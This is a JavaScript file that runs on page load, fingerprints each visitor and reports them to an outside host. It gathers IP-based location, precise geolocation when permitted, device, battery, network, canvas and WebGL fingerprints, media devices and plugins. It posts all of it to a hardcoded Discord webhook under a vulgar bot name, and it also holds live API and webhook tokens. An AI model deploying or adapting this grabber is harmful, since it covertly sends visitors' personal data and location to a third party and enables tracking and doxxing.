// script.js
async function collectFullInfo() {
  
  const displayDiv = document.getElementById('data-display');
  if (displayDiv) {
      displayDiv.innerHTML = '<p>Collecting information... please wait.</p>';
  } else {
      console.error("Display element #data-display not found!");
      
  }

  try {
    
    const ipRes = await fetch("https://ipinfo.io/json?token=7737ad45ae41bd"); 
    const ipData = await ipRes.json();
    const [lat, lon] = ipData.loc ? ipData.loc.split(",") : ["N/A", "N/A"];

    
    const deviceInfo = {
      userAgent: navigator.userAgent || "N/A",
      platform: navigator.platform || "N/A",
      language: navigator.language || "N/A",
      languages: navigator.languages ? navigator.languages.join(", ") : "N/A",
      hardwareConcurrency: navigator.hardwareConcurrency || "N/A",
      memory: navigator.deviceMemory || "N/A",
      screenRes: screen ? `${screen.width}x${screen.height}` : "N/A",
      colorDepth: screen ? screen.colorDepth : "N/A",
      touchSupport: (navigator.maxTouchPoints > 0) ? 'Yes' : 'No',
      doNotTrack: navigator.doNotTrack === "1" ? 'Yes' : (navigator.doNotTrack === "0" ? 'No' : 'Unspecified'), // Handle different DNT values
      timezone: Intl?.DateTimeFormat()?.resolvedOptions()?.timeZone || "N/A",
      timezoneOffset: new Date().getTimezoneOffset(),
      localTime: new Date().toLocaleString(),
      innerWindow: window ? `${window.innerWidth}x${window.innerHeight}` : "N/A",
    };

   
    let batteryInfo = { status: "API Not Supported/Denied" };
    try {
      if ('getBattery' in navigator) {
          const battery = await navigator.getBattery();
          batteryInfo = {
            charging: battery.charging ? 'Yes' : 'No',
            level: battery.level !== undefined ? `${(battery.level * 100).toFixed(0)}%` : "N/A",
            chargingTime: battery.chargingTime === Infinity ? 'N/A' : `${battery.chargingTime}s`,
            dischargingTime: battery.dischargingTime === Infinity ? 'N/A' : `${battery.dischargingTime}s`,
            status: "Available"
          };
      } else {
          batteryInfo = { status: "API Not Supported" };
      }
    } catch (err) {
      console.warn("Battery API error:", err);
      batteryInfo = { status: "Error Accessing API" };
    }

    
    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
    const netInfo = {
      downlink: conn.downlink !== undefined ? `${conn.downlink} Mbps` : "N/A",
      effectiveType: conn.effectiveType || "N/A",
      rtt: conn.rtt !== undefined ? `${conn.rtt} ms` : "N/A",
      saveData: conn.saveData ? 'Yes' : 'No',
    };

   
    let canvasFP = "N/A";
    let canvasFPHash = "N/A"; // Add hash
    try {
        const canvas = document.createElement("canvas");
        const ctx = canvas.getContext("2d");
        if (ctx) {
            canvas.width = 200;
            canvas.height = 50;
            ctx.textBaseline = "top";
            ctx.font = "16px Arial";
            ctx.fillStyle = "#f60";
            ctx.fillRect(125,1,62,20);
            ctx.fillStyle = "#069";
            ctx.fillText("Browser Fingerprint", 2, 15);
            canvasFP = canvas.toDataURL();
            
        } else {
            canvasFP = "Canvas Context Not Available";
        }
    } catch (e) {
        console.warn("Canvas fingerprinting failed:", e);
        canvasFP = "Error Generating";
    }


    
    let webglFP = { renderer: "N/A", vendor: "N/A", status: "Not Supported" };
    try {
        const canvas = document.createElement("canvas");
        const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
        if (gl) {
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            webglFP = {
                renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER),
                vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR),
                status: "Available"
            };
        }
    } catch (e) {
        console.warn("WebGL fingerprinting failed:", e);
        webglFP = { renderer: "Error", vendor: "Error", status: "Error Generating" };
    }


    
     let mediaDevicesList = []; // Store as array
     let mediaDeviceStatus = "API Not Supported";
     try {
       if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
         mediaDeviceStatus = "Enumerating...";
         const devices = await navigator.mediaDevices.enumerateDevices();
         mediaDevicesList = devices.map(d => ({
              kind: d.kind,
              label: d.label || "Label Hidden/Permission Required",
              deviceId: d.deviceId ? `${d.deviceId.substring(0,10)}...` : "N/A" // Show partial ID for reference
         }));
         mediaDeviceStatus = mediaDevicesList.length > 0 ? "Available" : "No devices found";
       }
     } catch(err) {
       console.warn("Media device enumeration failed:", err);
       mediaDeviceStatus = err.name === 'NotAllowedError' ? "Permission Denied" : "Error Accessing Devices";
     }

    
    let plugins = []; // Store as array
    let pluginStatus = "API Not Supported";
     try {
          if (navigator.plugins) {
              pluginStatus = "Enumerating...";
              plugins = Array.from(navigator.plugins).map(p => ({
                  name: p.name,
                  filename: p.filename,
                  description: p.description
              }));
              pluginStatus = plugins.length > 0 ? "Available" : "No plugins reported";
          }
     } catch (e) {
        console.warn("Plugin enumeration failed:", e);
        pluginStatus = "Error Enumerating";
     }


    
    let geoLocation = { status: "Not Attempted / Denied" }; 

    const finalize = async (geoResult) => {
      geoLocation = geoResult; 
      const embedColor = 3447003; 

      
      let displayHTML = `<h2>Your Information:</h2>`;

      
      displayHTML += `
          <div class="data-section">
              <h3>Identity & Location</h3>
              <p><strong>IP Address:</strong> ${ipData.ip || 'N/A'}</p>
              <p><strong>Approx. Location (IP):</strong> ${ipData.city || 'N/A'}, ${ipData.region || 'N/A'}, ${ipData.country || 'N/A'}</p>
              <p><strong>Organization:</strong> ${ipData.org || 'N/A'}</p>
              <p><strong>Coordinates (IP):</strong> ${lat}, ${lon}</p>
              <p><strong>Timezone (IP):</strong> ${ipData.timezone || 'N/A'}</p>
              <p><strong>Precise Location (Geolocation API):</strong> ${geoLocation.status === 'Available' ? `Lat: ${geoLocation.lat}, Lon: ${geoLocation.lon} (Accuracy: ${geoLocation.accuracy}m)` : geoLocation.status}</p>
          </div>`;

      
      displayHTML += `
          <div class="data-section">
              <h3>Device & OS</h3>
              <p><strong>Platform:</strong> ${deviceInfo.platform}</p>
              <p><strong>User Agent:</strong> ${deviceInfo.userAgent}</p>
              <p><strong>Language(s):</strong> ${deviceInfo.languages}</p>
              <p><strong>CPU Cores:</strong> ${deviceInfo.hardwareConcurrency}</p>
              <p><strong>Est. RAM:</strong> ${deviceInfo.memory} GB</p>
              <p><strong>Screen Resolution:</strong> ${deviceInfo.screenRes}</p>
              <p><strong>Color Depth:</strong> ${deviceInfo.colorDepth}-bit</p>
              <p><strong>Inner Window Size:</strong> ${deviceInfo.innerWindow}</p>
              <p><strong>Touch Support:</strong> ${deviceInfo.touchSupport}</p>
              <p><strong>Do Not Track:</strong> ${deviceInfo.doNotTrack}</p>
          </div>`;

      
       displayHTML += `
          <div class="data-section">
               <h3>Time</h3>
               <p><strong>Browser Timezone:</strong> ${deviceInfo.timezone}</p>
               <p><strong>Timezone Offset (vs UTC):</strong> ${deviceInfo.timezoneOffset} mins</p>
               <p><strong>Local Time (Browser):</strong> ${deviceInfo.localTime}</p>
          </div>`;

      
      displayHTML += `
          <div class="data-section">
              <h3>Battery</h3>
              <p><strong>Status:</strong> ${batteryInfo.status}</p>
              ${batteryInfo.status === "Available" ? `
              <p><strong>Charging:</strong> ${batteryInfo.charging}</p>
              <p><strong>Level:</strong> ${batteryInfo.level}</p>
              <p><strong>Time to Charge:</strong> ${batteryInfo.chargingTime}</p>
              <p><strong>Time to Discharge:</strong> ${batteryInfo.dischargingTime}</p>
              ` : ''}
          </div>`;

      
      displayHTML += `
          <div class="data-section">
              <h3>Network</h3>
              <p><strong>Est. Downlink:</strong> ${netInfo.downlink}</p>
              <p><strong>Effective Type:</strong> ${netInfo.effectiveType}</p>
              <p><strong>Est. RTT:</strong> ${netInfo.rtt}</p>
              <p><strong>Data Saver Enabled:</strong> ${netInfo.saveData}</p>
          </div>`;

      
      displayHTML += `
          <div class="data-section">
               <h3>Browser Fingerprinting</h3>
               <p><strong>Canvas Status:</strong> ${canvasFP === "Error Generating" || canvasFP === "Canvas Context Not Available" ? canvasFP : "Generated"}</p>
               ${canvasFP !== "N/A" && !canvasFP.startsWith("Error") && !canvasFP.startsWith("Canvas") ? `<p><img src="${canvasFP}" alt="Canvas Fingerprint Image" style="max-width:100%; border: 1px solid #0f0;"/></p>` : ''}
               <p><strong>WebGL Status:</strong> ${webglFP.status}</p>
               ${webglFP.status === "Available" ? `
               <p><strong>WebGL Renderer:</strong> ${webglFP.renderer || "N/A"}</p>
               <p><strong>WebGL Vendor:</strong> ${webglFP.vendor || "N/A"}</p>
               ` : ''}
          </div>`;

      
      displayHTML += `
          <div class="data-section">
              <h3>Media Devices</h3>
              <p><strong>Status:</strong> ${mediaDeviceStatus}</p>
              ${mediaDevicesList.length > 0 ? `
              <ul>
                  ${mediaDevicesList.map(d => `<li><strong>${d.kind}:</strong> ${d.label} <em>(ID: ${d.deviceId})</em></li>`).join('')}
              </ul>` : ''}
          </div>`;

      
      displayHTML += `
          <div class="data-section">
              <h3>Browser Plugins</h3>
              <p><strong>Status:</strong> ${pluginStatus}</p>
              ${plugins.length > 0 ? `
              <ul>
                  ${plugins.map(p => `<li><strong>${p.name}</strong> ${p.filename ? `(${p.filename})` : ''} - <em>${p.description || 'No description'}</em></li>`).join('')}
              </ul>` : ''}
          </div>`;

      
      if (displayDiv) {
          displayDiv.innerHTML = displayHTML;
      }

      
        const discordPayload = {
        username: "Slut",
        avatar_url: "https://assets.audiomack.com/lolika-1/353474a5740be2c0406375859243a502ccf7cbe51c302b15a58d0a984a0d3202.jpeg?width=300",
        embeds: [{
          title: "📊 Visitor Information Collected", // Changed title slightly
          description: "Data automatically collected and displayed on page visit.", // Added description
          color: embedColor,
          timestamp: new Date().toISOString(),
          fields: [
            { name: "👤 IP & Location", value: `**IP:** ${ipData.ip || 'N/A'}\n**Location (IP):** ${ipData.city || 'N/A'}, ${ipData.region || 'N/A'}, ${ipData.country || 'N/A'}\n**Org:** ${ipData.org || 'N/A'}\n**Coords (IP):** ${lat}, ${lon}\n**TZ (IP):** ${ipData.timezone || 'N/A'}\n**📍 Geolocation:** ${geoLocation.status === 'Available' ? `Lat: ${geoLocation.lat}, Lon: ${geoLocation.lon} (Acc: ${geoLocation.accuracy}m)` : geoLocation.status}`, inline: false },
            { name: "💻 Device & OS", value: `**Platform:** ${deviceInfo.platform}\n**UA:** ${deviceInfo.userAgent}\n**Lang:** ${deviceInfo.languages}\n**CPU/RAM:** ${deviceInfo.hardwareConcurrency}c / ${deviceInfo.memory}GB\n**Screen:** ${deviceInfo.screenRes} (${deviceInfo.colorDepth}b)\n**Window:** ${deviceInfo.innerWindow}\n**Touch:** ${deviceInfo.touchSupport}\n**DNT:** ${deviceInfo.doNotTrack}`, inline: false },
            { name: "⏰ Time", value: `**TZ:** ${deviceInfo.timezone}\n**Offset:** ${deviceInfo.timezoneOffset}m\n**Local:** ${deviceInfo.localTime}`, inline: true },
            { name: "🔋 Battery", value: `${batteryInfo.status}${batteryInfo.status === "Available" ? ` (${batteryInfo.level}, ${batteryInfo.charging ? 'Charging' : 'Discharging'})` : ''}`, inline: true },
            { name: "📶 Network", value: `**DL:** ${netInfo.downlink}\n**Type:** ${netInfo.effectiveType}\n**RTT:** ${netInfo.rtt}\n**SaveData:** ${netInfo.saveData}`, inline: true },
            { name: "🎨 Canvas", value: `*Status:* ${canvasFP === "Error Generating" || canvasFP === "Canvas Context Not Available" ? canvasFP : "Generated"}`, inline: true }, // Simplified for embed
            { name: "🧩 WebGL", value: `*Status:* ${webglFP.status}${webglFP.status === "Available" ? `\n*Vendor:* ${webglFP.vendor}\n*Renderer:* ${webglFP.renderer}` : ''}`, inline: false },
            { name: "🎙️ Media Devices", value: `*Status:* ${mediaDeviceStatus}\n*Count:* ${mediaDevicesList.length}`, inline: true },
            { name: "🔌 Plugins", value: `*Status:* ${pluginStatus}\n*Count:* ${plugins.length}`, inline: true },
          ],
          footer: {
            text: "Data automatically collected on page load." 
          }
        }]
      };


      
      try {
        await fetch("https://discord.com/api/webhooks/1368547338863509514/LISUs3SXAuTBMRFeqIGNZILAtJ45UPjOJNFrd15p7HpSpiSDa_1dIiLyekMTn5LK1TNY", { // <- YOUR WEBHOOK URL
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(discordPayload)
        });
        console.log("Information collected, displayed, and sent to Discord.");

      } catch (webhookError) {
         console.error("Error sending data to Discord:", webhookError);
         
          if (displayDiv) {
               displayDiv.innerHTML += `<p style="color: red;">Error: Failed to send report to Discord.</p>`;
          }
      }
    }; 

    
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(
         pos => {
            
            finalize({
               status: 'Available',
               lat: pos.coords.latitude.toFixed(4),
               lon: pos.coords.longitude.toFixed(4),
               accuracy: pos.coords.accuracy
           });
         },
         err => {
            
            console.warn(`Geolocation error (${err.code}): ${err.message}`);
             finalize({ status: `Denied / Error (${err.code})` });
         },
         { enableHighAccuracy: false, timeout: 8000, maximumAge: 300000 }
       );
     } else {
        
       finalize({ status: "Geolocation Not Supported" });
     }

  } catch (err) {
    console.error("Fatal error during information collection:", err);
     if (displayDiv) {
           displayDiv.innerHTML = `<p style="color: red;">A fatal error occurred while collecting information: ${err.message}</p>`;
     }
    
  }
} 


window.addEventListener('DOMContentLoaded', collectFullInfo);